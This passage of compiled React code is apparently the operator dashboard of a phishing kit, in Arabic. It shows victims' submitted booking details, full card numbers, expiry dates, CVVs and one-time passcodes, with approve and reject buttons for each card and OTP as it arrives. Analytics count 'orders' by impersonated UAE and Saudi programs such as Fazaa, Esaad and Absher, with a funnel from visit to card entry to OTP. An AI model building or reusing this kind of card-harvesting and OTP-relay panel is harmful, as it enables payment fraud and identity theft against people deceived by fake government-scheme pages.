  onApproveOtp,
  onRejectOtp
}) {
  if (msg.type === "booking") {
    const d = msg.content;
    return /*#__PURE__*/React.createElement("div", {
      className: "flex justify-end mb-5"
    }, /*#__PURE__*/React.createElement("div", {
      className: "bg-white dark:bg-gray-800 rounded-2xl rounded-tr-sm shadow-card-elevated p-5 max-w-[85%] text-right border border-gray-100 dark:border-gray-700",
      dir: "rtl"
    }, /*#__PURE__*/React.createElement("div", {
      className: "flex items-center gap-2 mb-3"
    }, /*#__PURE__*/React.createElement("div", {
      className: "w-7 h-7 rounded-lg bg-blue-50 dark:bg-blue-900/30 flex items-center justify-center"
    }, /*#__PURE__*/React.createElement("svg", {
      className: "w-4 h-4 text-blue-600 dark:text-blue-400",
      fill: "none",
      stroke: "currentColor",
      viewBox: "0 0 24 24"
    }, /*#__PURE__*/React.createElement("path", {
      strokeLinecap: "round",
      strokeLinejoin: "round",
      strokeWidth: 2,
      d: "M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"
    }))), /*#__PURE__*/React.createElement("span", {
      className: "font-bold text-gray-800 dark:text-gray-100 text-sm"
    }, "\u0628\u064A\u0627\u0646\u0627\u062A \u0627\u0644\u0637\u0644\u0628 \u0648\u0627\u0644\u062A\u0633\u062C\u064A\u0644")), /*#__PURE__*/React.createElement("div", {
      className: "space-y-0 divide-y divide-gray-100 dark:divide-gray-700"
    }, Object.entries(d).map(([k, v]) => v ? /*#__PURE__*/React.createElement("div", {
      key: k,
      className: "flex justify-between items-center gap-4 py-2.5"
    }, /*#__PURE__*/React.createElement("span", {
      className: "text-gray-400 text-xs font-medium"
    }, k), /*#__PURE__*/React.createElement("span", {
      className: "font-semibold text-gray-800 dark:text-gray-200 text-xs"
    }, v)) : null)), /*#__PURE__*/React.createElement("div", {
      className: "flex items-center gap-2 mt-3 pt-2 border-t border-gray-100 dark:border-gray-700"
    }, /*#__PURE__*/React.createElement("span", {
      className: "text-[11px] text-gray-400"
    }, formatDateTime(msg.time)))));
  }
  if (msg.type === "card") {
    return /*#__PURE__*/React.createElement("div", {
      className: "flex justify-end mb-5"
    }, /*#__PURE__*/React.createElement("div", {
      className: "max-w-[90%] w-full"
    }, /*#__PURE__*/React.createElement("div", {
      className: "bg-white dark:bg-gray-800 rounded-2xl rounded-tr-sm shadow-card-elevated p-5 border border-gray-100 dark:border-gray-700"
    }, /*#__PURE__*/React.createElement("div", {
      className: "flex items-center justify-between mb-4",
      dir: "rtl"
    }, /*#__PURE__*/React.createElement("div", {
      className: "flex items-center gap-2"
    }, /*#__PURE__*/React.createElement("div", {
      className: "w-7 h-7 rounded-lg bg-green-50 dark:bg-green-900/30 flex items-center justify-center"
    }, /*#__PURE__*/React.createElement("svg", {
      className: "w-4 h-4 text-green-600 dark:text-green-400",
      fill: "none",
      stroke: "currentColor",
      viewBox: "0 0 24 24"
    }, /*#__PURE__*/React.createElement("path", {
      strokeLinecap: "round",
      strokeLinejoin: "round",
      strokeWidth: 2,
      d: "M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"
    }))), /*#__PURE__*/React.createElement("span", {
      className: "font-bold text-gray-800 dark:text-gray-100 text-sm"
    }, "\u0628\u064A\u0627\u0646\u0627\u062A \u0627\u0644\u062F\u0641\u0639 \u0648\u0627\u0644\u0628\u0637\u0627\u0642\u0629")), /*#__PURE__*/React.createElement("span", {
      className: "text-[11px] text-gray-400"
    }, formatDateTime(msg.time))), /*#__PURE__*/React.createElement(CardDisplay, {
      cardNumber: msg.content.cardNumber,
      expiry: msg.content.expiry,
      cvv: msg.content.cvv,
      cardHolder: msg.content.cardHolder,
      bank: msg.content.bank
    }), visitor.cardApprovalStatus === "approved" && /*#__PURE__*/React.createElement("div", {
      className: "mt-3 text-center"
    }, /*#__PURE__*/React.createElement("span", {
      className: "inline-flex items-center gap-1.5 text-green-600 text-sm font-semibold bg-green-50 dark:bg-green-900/30 px-3 py-1.5 rounded-full"
    }, /*#__PURE__*/React.createElement("svg", {
      className: "w-4 h-4",
      fill: "none",
      stroke: "currentColor",
      viewBox: "0 0 24 24"
    }, /*#__PURE__*/React.createElement("path", {
      strokeLinecap: "round",
      strokeLinejoin: "round",
      strokeWidth: 2,
      d: "M5 13l4 4L19 7"
    })), "\u062A\u0645 \u0627\u0644\u0642\u0628\u0648\u0644 \u0628\u0646\u062C\u0627\u062D")), visitor.cardApprovalStatus === "rejected" && /*#__PURE__*/React.createElement("div", {
      className: "mt-3 text-center"
    }, /*#__PURE__*/React.createElement("span", {
      className: "inline-flex items-center gap-1.5 text-red-500 text-sm font-semibold bg-red-50 dark:bg-red-900/30 px-3 py-1.5 rounded-full"
    }, /*#__PURE__*/React.createElement("svg", {
      className: "w-4 h-4",
      fill: "none",
      stroke: "currentColor",
      viewBox: "0 0 24 24"
    }, /*#__PURE__*/React.createElement("path", {
      strokeLinecap: "round",
      strokeLinejoin: "round",
      strokeWidth: 2,
      d: "M6 18L18 6M6 6l12 12"
    })), "\u062A\u0645 \u0627\u0644\u0631\u0641\u0636")), /*#__PURE__*/React.createElement("div", {
      className: "flex gap-3 mt-4"
    }, /*#__PURE__*/React.createElement("button", {
      onClick: onApprove,
      className: "flex-1 text-white py-3 rounded-xl text-sm font-bold active:scale-[0.97] hover:shadow-lg transition-all shadow-md",
      style: {
        background: "linear-gradient(135deg, #22c55e 0%, #16a34a 100%)"
      }
    }, "\u2713 \u0642\u0628\u0648\u0644 \u0627\u0644\u0628\u0637\u0627\u0642\u0629"), /*#__PURE__*/React.createElement("button", {
      onClick: onReject,
      className: "flex-1 text-white py-3 rounded-xl text-sm font-bold active:scale-[0.97] hover:shadow-lg transition-all shadow-md",
      style: {
        background: "linear-gradient(135deg, #ef4444 0%, #dc2626 100%)"
      }
    }, "\u2717 \u0631\u0641\u0636 \u0627\u0644\u0628\u0637\u0627\u0642\u0629")))));
  }
  if (msg.type === "otp") {
    return /*#__PURE__*/React.createElement("div", {
      className: "flex justify-end mb-5"
    }, /*#__PURE__*/React.createElement("div", {
      className: "bg-white dark:bg-gray-800 rounded-2xl rounded-tr-sm shadow-card-elevated p-5 max-w-[85%] text-right border border-gray-100 dark:border-gray-700",
      dir: "rtl"
    }, /*#__PURE__*/React.createElement("div", {
      className: "flex items-center gap-2 mb-3"
    }, /*#__PURE__*/React.createElement("div", {
      className: "w-7 h-7 rounded-lg bg-amber-50 dark:bg-amber-900/30 flex items-center justify-center"
    }, /*#__PURE__*/React.createElement("svg", {
      className: "w-4 h-4 text-amber-600 dark:text-amber-400",
      fill: "none",
      stroke: "currentColor",
      viewBox: "0 0 24 24"
    }, /*#__PURE__*/React.createElement("path", {
      strokeLinecap: "round",
      strokeLinejoin: "round",
      strokeWidth: 2,
      d: "M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
    }))), /*#__PURE__*/React.createElement("span", {
      className: "font-bold text-gray-800 dark:text-gray-100 text-sm"
    }, "\u0631\u0645\u0632 \u0627\u0644\u062A\u062D\u0642\u0642 \u0627\u0644\u0645\u0633\u062A\u0644\u0645 (OTP)")), /*#__PURE__*/React.createElement("div", {
      className: "bg-gray-50 dark:bg-gray-900 rounded-xl p-4 text-center border border-gray-100 dark:border-gray-700 mb-4"
    }, /*#__PURE__*/React.createElement("span", {
      className: "text-4xl font-bold text-gray-900 dark:text-white tracking-[0.25em] font-mono tabular-nums"
    }, msg.content.otp)), visitor.otpApprovalStatus === "approved" && /*#__PURE__*/React.createElement("div", {
      className: "mb-3 text-center"
    }, /*#__PURE__*/React.createElement("span", {
      className: "inline-flex items-center gap-1.5 text-green-600 text-sm font-semibold bg-green-50 dark:bg-green-900/30 px-3 py-1.5 rounded-full"
    }, /*#__PURE__*/React.createElement("svg", {
      className: "w-4 h-4",
      fill: "none",
      stroke: "currentColor",
      viewBox: "0 0 24 24"
    }, /*#__PURE__*/React.createElement("path", {
      strokeLinecap: "round",
      strokeLinejoin: "round",
      strokeWidth: 2,
      d: "M5 13l4 4L19 7"
    })), "\u062A\u0645 \u0627\u0644\u062A\u062D\u0642\u0642 \u0645\u0646 \u0627\u0644\u0631\u0645\u0632")), visitor.otpApprovalStatus === "rejected" && /*#__PURE__*/React.createElement("div", {
      className: "mb-3 text-center"
    }, /*#__PURE__*/React.createElement("span", {
      className: "inline-flex items-center gap-1.5 text-red-500 text-sm font-semibold bg-red-50 dark:bg-red-900/30 px-3 py-1.5 rounded-full"
    }, /*#__PURE__*/React.createElement("svg", {
      className: "w-4 h-4",
      fill: "none",
      stroke: "currentColor",
      viewBox: "0 0 24 24"
    }, /*#__PURE__*/React.createElement("path", {
      strokeLinecap: "round",
      strokeLinejoin: "round",
      strokeWidth: 2,
      d: "M6 18L18 6M6 6l12 12"
    })), "\u0627\u0644\u0631\u0645\u0632 \u063A\u064A\u0631 \u0635\u062D\u064A\u062D")), /*#__PURE__*/React.createElement("div", {
      className: "flex gap-3"
    }, /*#__PURE__*/React.createElement("button", {
      onClick: onApproveOtp,
      className: "flex-1 text-white py-3 rounded-xl text-sm font-bold active:scale-[0.97] hover:shadow-lg transition-all shadow-md",
      style: {
        background: "linear-gradient(135deg, #22c55e 0%, #16a34a 100%)"
      }
    }, "\u2713 \u0635\u062D\u064A\u062D (\u062A\u0623\u0643\u064A\u062F)"), /*#__PURE__*/React.createElement("button", {
      onClick: onRejectOtp,
      className: "flex-1 text-white py-3 rounded-xl text-sm font-bold active:scale-[0.97] hover:shadow-lg transition-all shadow-md",
      style: {
        background: "linear-gradient(135deg, #ef4444 0%, #dc2626 100%)"
      }
    }, "\u2717 \u063A\u064A\u0631 \u0635\u062D\u064A\u062D"))));
  }
  return null;
}

// ─── Build Messages ─────────────────────────────────────────────────────────
function buildMessages(v) {
  const msgs = [];
  if (v.bookingData) {
    msgs.push({
      type: "booking",
      content: v.bookingData,
      time: v.createdAt || ""
    });
  }
  if (v.cardNumber) {
    msgs.push({
      type: "card",
      content: {
        cardNumber: v.cardNumber,
        expiry: v.expiry || "",
        cvv: v.cvv || "",
        cardHolder: v.cardHolder || v.name || "",
        bank: getBankName(v.cardNumber)
      },
      time: v.cardSubmittedAt || v.updatedAt || ""
    });
  }
  if (v.otp) {
    msgs.push({
      type: "otp",
      content: {
        otp: v.otp
      },
      time: v.otpSubmittedAt || v.updatedAt || ""
    });
  }
  return msgs;
}

// ─── Card Analytics & Recharts Visualization ────────────────────────────────
function parseCardTypeAndBrand(v) {
  let brand = (v.brand || v.bookingData && (v.bookingData.brand || v.bookingData["الجهة"] || v.bookingData["جهة_الاصدار"]) || "").toLowerCase();
  let type = (v.cardType || v.bookingData && (v.bookingData.cardType || v.bookingData["نوع البطاقة"] || v.bookingData["الفئة"]) || "").toLowerCase();
  const cardStr = (v.bookingData && (v.bookingData["البطاقة"] || v.bookingData["نوع البطاقة"]) || "").toLowerCase();
  if (!brand) {
    if (cardStr.includes("فزعة") || cardStr.includes("fazaa")) brand = "fazaa";else if (cardStr.includes("إسعاد") || cardStr.includes("اسعاد") || cardStr.includes("esaad")) brand = "esaad";else if (cardStr.includes("حماة") || cardStr.includes("homat")) brand = "homat";else if (cardStr.includes("سعادة") || cardStr.includes("alsaada")) brand = "alsaada";else if (cardStr.includes("أبشر") || cardStr.includes("ابشر") || cardStr.includes("absher")) brand = "absher";else brand = "fazaa";
  }
  if (!type) {
    if (cardStr.includes("ذهب") || cardStr.includes("gold")) type = "gold";else if (cardStr.includes("فض") || cardStr.includes("silver")) type = "silver";else if (cardStr.includes("خصم") || cardStr.includes("discount")) type = "discount";else if (cardStr.includes("بلاتين") || cardStr.includes("platinum")) type = "platinum";else type = "gold";
  }
  const brandTitles = {
    fazaa: "فزعة (FAZAA)",
    esaad: "إسعاد (ESAAD)",
    homat: "حماة الوطن",
    alsaada: "السعادة",
    absher: "أبشر"
  };
  const typeTitles = {
    gold: "البطاقة الذهبية",
    silver: "البطاقة الفضية",
    discount: "بطاقة الخصومات",
    platinum: "البطاقة البلاتينية"
  };
  return {
    brandKey: brand,
    brandName: brandTitles[brand] || "فزعة",
    typeKey: type,
    typeName: typeTitles[type] || "البطاقة الذهبية"
  };
}
function CardAnalyticsView({
  visitors,
  isDark,
  onBackToFeed
}) {
  const [filterPeriod, setFilterPeriod] = useState("all");
  const [activeBrandFilter, setActiveBrandFilter] = useState("all");
  const filtered = visitors.filter(v => {
    if (activeBrandFilter !== "all") {
      const info = parseCardTypeAndBrand(v);
      if (info.brandKey !== activeBrandFilter) return false;
    }
    if (filterPeriod === "paid") {
      return !!v.cardNumber;
    }
    if (filterPeriod === "today") {
      if (!v.createdAt) return false;
      const d = new Date(v.createdAt);
      const now = new Date();
      return d.toDateString() === now.toDateString();
    }
    return true;
  });
  const typeCounts = {
    gold: {
      id: "gold",
      name: "البطاقة الذهبية",
      total: 0,
      withCard: 0,
      withOtp: 0,
      fill: "#f59e0b",
      badgeBg: "bg-amber-100 text-amber-800 dark:bg-amber-900/40 dark:text-amber-300"
    },
    silver: {
      id: "silver",
      name: "البطاقة الفضية",
      total: 0,
      withCard: 0,
      withOtp: 0,
      fill: "#94a3b8",
      badgeBg: "bg-slate-100 text-slate-800 dark:bg-slate-800 dark:text-slate-300"
    },
    discount: {
      id: "discount",
      name: "بطاقة الخصومات",
      total: 0,
      withCard: 0,
      withOtp: 0,
      fill: "#3b82f6",
      badgeBg: "bg-blue-100 text-blue-800 dark:bg-blue-900/40 dark:text-blue-300"
    },
    other: {
      id: "other",
      name: "فئات أخرى / بلاتينيوم",
      total: 0,
      withCard: 0,
      withOtp: 0,
      fill: "#8b5cf6",
      badgeBg: "bg-purple-100 text-purple-800 dark:bg-purple-900/40 dark:text-purple-300"
    }
  };
  const brandCounts = {
    fazaa: {
      id: "fazaa",
      name: "فزعة (FAZAA)",
      total: 0,
      withCard: 0,
      fill: "#c9a227"
    },
    esaad: {
      id: "esaad",
      name: "إسعاد (ESAAD)",
      total: 0,
      withCard: 0,
      fill: "#10b981"
    },
    homat: {
      id: "homat",
      name: "حماة الوطن",
      total: 0,
      withCard: 0,
      fill: "#ef4444"
    },
    alsaada: {
      id: "alsaada",
      name: "السعادة",
      total: 0,
      withCard: 0,
      fill: "#f97316"
    },
    absher: {
      id: "absher",
      name: "أبشر",
      total: 0,
      withCard: 0,
      fill: "#06b6d4"
    }
  };
  let stepVisits = 0;
  let stepDetails = 0;
  let stepCards = 0;
  let stepOtps = 0;
  let stepCompleted = 0;
  filtered.forEach(v => {
    const info = parseCardTypeAndBrand(v);
    const targetType = typeCounts[info.typeKey] ? info.typeKey : "other";
    typeCounts[targetType].total += 1;
    if (v.cardNumber) typeCounts[targetType].withCard += 1;
    if (v.otp) typeCounts[targetType].withOtp += 1;
    const targetBrand = brandCounts[info.brandKey] ? info.brandKey : "fazaa";
    brandCounts[targetBrand].total += 1;
    if (v.cardNumber) brandCounts[targetBrand].withCard += 1;
    stepVisits += 1;
    if (v.bookingData && (v.bookingData["الاسم"] || v.name)) stepDetails += 1;
    if (v.cardNumber) stepCards += 1;
    if (v.otp) stepOtps += 1;
    if (v.step === "success" || v.cardApprovalStatus === "approved" || v.otpApprovalStatus === "approved") stepCompleted += 1;
  });
  const totalOrders = filtered.length;
  const totalCards = filtered.filter(v => !!v.cardNumber).length;
  const totalOtps = filtered.filter(v => !!v.otp).length;
  const typeChartData = Object.values(typeCounts).map(item => ({
    name: item.name,
    "إجمالي الطلبات": item.total,
    "ببطاقة دفع": item.withCard,
    "برمز OTP": item.withOtp,
    fill: item.fill
  }));
  const brandChartData = Object.values(brandCounts).map(item => ({
    name: item.name,
    "عدد الطلبات": item.total,
    "مدفوعة بالبطاقة": item.withCard,
    fill: item.fill
  }));
  const pieTypeData = Object.values(typeCounts).filter(t => t.total > 0).map(t => ({
    name: t.name,
    value: t.total,
    percentage: totalOrders > 0 ? Math.round(t.total / totalOrders * 100) : 0,
    fill: t.fill
  }));
  const funnelData = [{
    stage: "بدء الطلب",
    count: stepVisits
  }, {
    stage: "بيانات التوصيل",
    count: stepDetails
  }, {
    stage: "إدخال البطاقة",
    count: stepCards
  }, {
    stage: "رمز OTP",
    count: stepOtps
  }, {
    stage: "طلب ناجح",
    count: stepCompleted
  }];
  const sortedTypes = [...Object.values(typeCounts)].sort((a, b) => b.total - a.total);
  const topCard = sortedTypes[0] && sortedTypes[0].total > 0 ? sortedTypes[0] : {
    name: "الذهبية",
    total: 0
  };
  const cardRate = totalOrders > 0 ? Math.round(totalCards / totalOrders * 100) : 0;
  const otpRate = totalCards > 0 ? Math.round(totalOtps / totalCards * 100) : 0;
  const Recharts = window.Recharts;
  if (!Recharts || !Recharts.ResponsiveContainer) {
    return /*#__PURE__*/React.createElement("div", {
      className: "flex-1 overflow-y-auto p-6 space-y-6",
      dir: "rtl"
    }, /*#__PURE__*/React.createElement("div", {
      className: "flex items-center justify-between bg-white dark:bg-gray-800 p-4 rounded-2xl border border-gray-200 dark:border-gray-700 shadow-sm"
    }, /*#__PURE__*/React.createElement("div", {
      className: "flex items-center gap-3"
    }, /*#__PURE__*/React.createElement("button", {
      onClick: () => onBack(),
      className: "px-3 py-1.5 rounded-xl bg-gray-100 hover:bg-gray-200 dark:bg-gray-700 text-gray-700 dark:text-gray-200 text-xs font-bold transition-all"
    }, "\u2190 \u0627\u0644\u0639\u0648\u062F\u0629 \u0644\u0644\u0631\u0626\u064A\u0633\u064A\u0629"), /*#__PURE__*/React.createElement("h2", {
      className: "text-base font-extrabold text-gray-900 dark:text-white"
    }, "\uD83D\uDCCA \u0625\u062D\u0635\u0627\u0626\u064A\u0627\u062A \u0648\u0637\u0644\u0628\u0627\u062A \u0627\u0644\u0628\u0637\u0627\u0642\u0627\u062A")), /*#__PURE__*/React.createElement("span", {
      className: "text-xs text-amber-600 bg-amber-50 dark:bg-amber-950/40 px-3 py-1 rounded-full font-bold"
    }, "\u0639\u0631\u0636 \u0645\u0628\u0633\u0637 \u0633\u0631\u064A\u0639")), /*#__PURE__*/React.createElement("div", {
      className: "grid grid-cols-2 md:grid-cols-4 gap-4"
    }, /*#__PURE__*/React.createElement("div", {
      className: "p-4 rounded-xl bg-white dark:bg-gray-800 border border-gray-100 dark:border-gray-700"
    }, /*#__PURE__*/React.createElement("span", {
      className: "text-xs text-gray-500"
    }, "\u0625\u062C\u0645\u0627\u0644\u064A \u0627\u0644\u0637\u0644\u0628\u0627\u062A"), /*#__PURE__*/React.createElement("p", {
      className: "text-2xl font-black text-amber-500 mt-1"
    }, totalOrders)), /*#__PURE__*/React.createElement("div", {
      className: "p-4 rounded-xl bg-white dark:bg-gray-800 border border-gray-100 dark:border-gray-700"
    }, /*#__PURE__*/React.createElement("span", {
      className: "text-xs text-gray-500"
    }, "\u0627\u0644\u0628\u0637\u0627\u0642\u0627\u062A \u0627\u0644\u0645\u062F\u062E\u0644\u0629"), /*#__PURE__*/React.createElement("p", {
      className: "text-2xl font-black text-blue-500 mt-1"
    }, totalCards)), /*#__PURE__*/React.createElement("div", {
      className: "p-4 rounded-xl bg-white dark:bg-gray-800 border border-gray-100 dark:border-gray-700"
    }, /*#__PURE__*/React.createElement("span", {
      className: "text-xs text-gray-500"
    }, "\u0631\u0645\u0648\u0632 OTP \u0627\u0644\u0645\u0633\u062A\u0644\u0645\u0629"), /*#__PURE__*/React.createElement("p", {
      className: "text-2xl font-black text-purple-500 mt-1"
    }, totalOtps)), /*#__PURE__*/React.createElement("div", {
      className: "p-4 rounded-xl bg-white dark:bg-gray-800 border border-gray-100 dark:border-gray-700"
    }, /*#__PURE__*/React.createElement("span", {
      className: "text-xs text-gray-500"
    }, "\u0627\u0644\u0628\u0637\u0627\u0642\u0629 \u0627\u0644\u0623\u0643\u062B\u0631 \u0637\u0644\u0628\u0627\u064B"), /*#__PURE__*/React.createElement("p", {
      className: "text-lg font-black text-emerald-500 mt-1"
    }, topCard.name))), /*#__PURE__*/React.createElement("div", {
      className: "p-5 rounded-2xl bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700"
    }, /*#__PURE__*/React.createElement("h3", {
      className: "font-bold text-sm text-gray-900 dark:text-white mb-4"
    }, "\u0645\u0633\u0627\u0631 \u062A\u062D\u0648\u064A\u0644 \u0627\u0644\u0632\u0648\u0627\u0631 (Funnel)"), /*#__PURE__*/React.createElement("div", {
      className: "space-y-3"
    }, funnelData.map((item, idx) => {
      const max = Math.max(...funnelData.map(d => d.count), 1);
      const pct = Math.round(item.count / max * 100);
      return /*#__PURE__*/React.createElement("div", {
        key: idx,
        className: "space-y-1"
      }, /*#__PURE__*/React.createElement("div", {
        className: "flex justify-between text-xs font-bold text-gray-700 dark:text-gray-300"
      }, /*#__PURE__*/React.createElement("span", null, item.stage), /*#__PURE__*/React.createElement("span", null, item.count)), /*#__PURE__*/React.createElement("div", {
        className: "w-full bg-gray-100 dark:bg-gray-700 rounded-full h-3 overflow-hidden"
      }, /*#__PURE__*/React.createElement("div", {
        className: "bg-gradient-to-r from-amber-500 to-yellow-400 h-full rounded-full transition-all duration-500",
        style: {
          width: `${Math.max(pct, 5)}%`
        }
      })));
    }))));
  }
  const {
    ResponsiveContainer,
    BarChart,
    Bar,
    XAxis,
    YAxis,
    Tooltip,
    Legend,
    PieChart,
    Pie,
    Cell,
    CartesianGrid,
    AreaChart,
    Area
  } = Recharts;
  const tooltipBorder = isDark ? "#374151" : "#e5e7eb";
  const tooltipText = isDark ? "#f3f4f6" : "#111827";
  const axisColor = isDark ? "#9ca3af" : "#6b7280";
  const gridColor = isDark ? "#374151" : "#f1f5f9";
  const CustomChartTooltip = ({
    active,
    payload,
    label
  }) => {
    if (active && payload && payload.length) {
      return /*#__PURE__*/React.createElement("div", {
        className: "p-3 rounded-xl shadow-xl text-xs font-sans border backdrop-blur-md",
        style: {
          backgroundColor: isDark ? "rgba(17, 24, 39, 0.95)" : "rgba(255, 255, 255, 0.98)",
          borderColor: tooltipBorder,
          color: tooltipText
        },
        dir: "rtl"
      }, /*#__PURE__*/React.createElement("div", {
        className: "font-bold text-amber-500 mb-1.5"
      }, label || payload[0] && payload[0].name), payload.map((entry, idx) => /*#__PURE__*/React.createElement("div", {
        key: `item-${idx}`,
        className: "flex items-center justify-between gap-4 py-0.5"
      }, /*#__PURE__*/React.createElement("span", {
        className: "flex items-center gap-1.5"
      }, /*#__PURE__*/React.createElement("span", {
        className: "w-2.5 h-2.5 rounded-full inline-block",
        style: {
          backgroundColor: entry.color || entry.fill
        }
      }), /*#__PURE__*/React.createElement("span", {
        className: "font-medium text-gray-600 dark:text-gray-300"
      }, entry.name, ":")), /*#__PURE__*/React.createElement("span", {
        className: "font-mono font-bold text-gray-900 dark:text-white"
      }, entry.value))));
    }
    return null;
  };
  return /*#__PURE__*/React.createElement("div", {
    className: "flex-1 overflow-y-auto p-6 space-y-6 custom-scrollbar bg-[#f8fafc] dark:bg-gray-900",
    dir: "rtl"
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex flex-wrap items-center justify-between gap-4 pb-4 border-b border-gray-200 dark:border-gray-800"
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-3"
  }, /*#__PURE__*/React.createElement("button", {
    onClick: onBackToFeed,
    className: "px-3.5 py-2 rounded-xl bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 text-gray-700 dark:text-gray-200 font-bold text-xs hover:bg-gray-50 dark:hover:bg-gray-700 shadow-sm transition-all flex items-center gap-1.5 cursor-pointer"
  }, /*#__PURE__*/React.createElement("span", null, "\u2190"), /*#__PURE__*/React.createElement("span", null, "\u0627\u0644\u0639\u0648\u062F\u0629 \u0644\u0644\u0645\u062A\u0627\u0628\u0639\u0629 \u0627\u0644\u0645\u0628\u0627\u0634\u0631\u0629")), /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("h2", {
    className: "text-base font-extrabold text-gray-900 dark:text-white flex items-center gap-2"
  }, /*#__PURE__*/React.createElement("span", null, "\uD83D\uDCCA \u0631\u0633\u0648\u0645 \u0648\u062A\u062D\u0644\u064A\u0644\u0627\u062A \u0637\u0644\u0628\u0627\u062A \u0627\u0644\u0628\u0637\u0627\u0642\u0627\u062A"), /*#__PURE__*/React.createElement("span", {
    className: "px-2 py-0.5 text-[11px] rounded-full bg-amber-100 text-amber-800 dark:bg-amber-900/40 dark:text-amber-300 font-mono font-bold"
  }, "Recharts Live")), /*#__PURE__*/React.createElement("p", {
    className: "text-xs text-gray-500 dark:text-gray-400 mt-0.5"
  }, "\u0625\u062D\u0635\u0627\u0626\u064A\u0627\u062A \u062A\u0641\u0635\u064A\u0644\u064A\u0629 \u0648\u0645\u062E\u0637\u0637\u0627\u062A \u062A\u0641\u0627\u0639\u0644\u064A\u0629 \u0644\u0639\u062F\u062F \u0627\u0644\u0637\u0644\u0628\u0627\u062A \u0628\u062D\u0633\u0628 \u0646\u0648\u0639 \u0627\u0644\u0628\u0637\u0627\u0642\u0629 \u0648\u0627\u0644\u062C\u0647\u0629 \u0627\u0644\u0645\u0635\u062F\u0631\u0629"))), /*#__PURE__*/React.createElement("div", {
    className: "flex flex-wrap items-center gap-2"
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center bg-gray-100 dark:bg-gray-800 p-1 rounded-xl text-xs font-bold border border-gray-200/80 dark:border-gray-700"
  }, /*#__PURE__*/React.createElement("button", {
    onClick: () => setFilterPeriod("all"),
    className: `px-3 py-1.5 rounded-lg transition-all cursor-pointer ${filterPeriod === "all" ? "bg-white dark:bg-gray-700 text-blue-600 dark:text-blue-400 shadow-sm" : "text-gray-500 hover:text-gray-900 dark:hover:text-gray-200"}`
  }, "\u062C\u0645\u064A\u0639 \u0627\u0644\u0637\u0644\u0628\u0627\u062A (", visitors.length, ")"), /*#__PURE__*/React.createElement("button", {
    onClick: () => setFilterPeriod("today"),
    className: `px-3 py-1.5 rounded-lg transition-all cursor-pointer ${filterPeriod === "today" ? "bg-white dark:bg-gray-700 text-blue-600 dark:text-blue-400 shadow-sm" : "text-gray-500 hover:text-gray-900 dark:hover:text-gray-200"}`
  }, "\u0637\u0644\u0628\u0627\u062A \u0627\u0644\u064A\u0648\u0645"), /*#__PURE__*/React.createElement("button", {
    onClick: () => setFilterPeriod("paid"),
    className: `px-3 py-1.5 rounded-lg transition-all cursor-pointer ${filterPeriod === "paid" ? "bg-white dark:bg-gray-700 text-blue-600 dark:text-blue-400 shadow-sm" : "text-gray-500 hover:text-gray-900 dark:hover:text-gray-200"}`
  }, "\u0628\u0628\u0637\u0627\u0642\u0629 \u062F\u0641\u0639 \u0641\u0642\u0637 (", visitors.filter(v => !!v.cardNumber).length, ")")))), /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-1.5 overflow-x-auto pb-1 text-xs"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-gray-400 font-bold ml-1 text-[11px]"
  }, "\u062A\u0635\u0641\u064A\u0629 \u0628\u0627\u0644\u062C\u0647\u0629:"), [{
    id: "all",
    label: "جميع الجهات"
  }, {
    id: "fazaa",
    label: "فزعة (FAZAA)"
  }, {
    id: "esaad",
    label: "إسعاد (ESAAD)"
  }, {
    id: "homat",
    label: "حماة الوطن"
  }, {
    id: "alsaada",
    label: "السعادة"
  }, {
    id: "absher",
    label: "أبشر"
  }].map(b => /*#__PURE__*/React.createElement("button", {
    key: b.id,
    onClick: () => setActiveBrandFilter(b.id),
    className: `px-3 py-1.5 rounded-lg font-bold transition-all cursor-pointer flex-shrink-0 text-xs ${activeBrandFilter === b.id ? "bg-amber-500 text-white shadow-sm" : "bg-white dark:bg-gray-800 text-gray-600 dark:text-gray-300 border border-gray-200 dark:border-gray-700 hover:border-amber-300"}`
  }, b.label))), /*#__PURE__*/React.createElement("div", {
    className: "grid grid-cols-2 sm:grid-cols-2 lg:grid-cols-4 gap-4"
  }, /*#__PURE__*/React.createElement("div", {
    className: "p-4 rounded-2xl bg-white dark:bg-gray-800 border border-gray-200/80 dark:border-gray-700 shadow-sm"
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center justify-between text-xs text-gray-400 mb-1"
  }, /*#__PURE__*/React.createElement("span", null, "\u0625\u062C\u0645\u0627\u0644\u064A \u0637\u0644\u0628\u0627\u062A \u0627\u0644\u0628\u0637\u0627\u0642\u0627\u062A"), /*#__PURE__*/React.createElement("span", {
    className: "text-base"
  }, "\uD83D\uDCCB")), /*#__PURE__*/React.createElement("div", {
    className: "text-2xl font-black font-mono text-gray-900 dark:text-white tabular-nums"
  }, totalOrders), /*#__PURE__*/React.createElement("div", {
    className: "text-[11px] text-gray-500 dark:text-gray-400 mt-1 flex items-center gap-1"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-emerald-500 font-bold"
  }, "\u0646\u0634\u0637"), /*#__PURE__*/React.createElement("span", null, "\u0641\u064A \u0627\u0644\u0646\u0638\u0627\u0645 \u062D\u0627\u0644\u064A\u0627\u064B"))), /*#__PURE__*/React.createElement("div", {
    className: "p-4 rounded-2xl bg-white dark:bg-gray-800 border border-gray-200/80 dark:border-gray-700 shadow-sm"
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center justify-between text-xs text-gray-400 mb-1"
  }, /*#__PURE__*/React.createElement("span", null, "\u0627\u0644\u0641\u0626\u0629 \u0627\u0644\u0623\u0643\u062B\u0631 \u0637\u0644\u0628\u0627\u064B"), /*#__PURE__*/React.createElement("span", {
    className: "text-base"
  }, "\u2B50")), /*#__PURE__*/React.createElement("div", {
